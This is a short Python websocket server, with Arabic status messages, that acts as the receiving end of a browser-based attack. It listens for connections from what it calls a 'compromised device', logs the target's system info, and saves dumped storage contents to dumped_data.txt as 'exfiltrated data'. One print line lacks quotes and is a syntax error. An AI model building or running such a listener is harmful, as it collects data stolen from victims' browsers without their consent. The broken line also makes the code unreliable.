import asyncio
import websockets
import json

async def handler(websocket, path):
    print(incoming := "[+] تم الاتصال بالجهاز المكسور بنجاح!")
    async for message in websocket:
        try:
            data = json.loads(message)
            action = data.get('action')
            
            if action == 'system_info':
                print(f"[+] معلومات النظام المستهدف: {data.get('ua')}")
            elif action == 'file_dump':
                print([+] تم استقبال محتوى تخزين بنجاح!)
                # حفظ البيانات المستخرجة في ملف نصي تلقائياً
                with open("dumped_data.txt", "w", encoding="utf-8") as f:
                    f.write(data.get('content'))
                print("[✔] تم حفظ البيانات المسحوبة في ملف: dumped_data.txt")
            elif action == 'error':
                print(f"[-] ملاحظة من المتصفح: {data.get('msg')}")
                
        except Exception as e:
            print(f"[-] خطأ في معالجة الحزمة: {e}")

async def main():
    async with websockets.serve(handler, "0.0.0.0", 8765):
        print("[*] الخادم الواقعي يعمل الآن وينتظر الاتصال العكسي...")
        await asyncio.Future()

if __name__ == '__main__':
    asyncio.run(main())
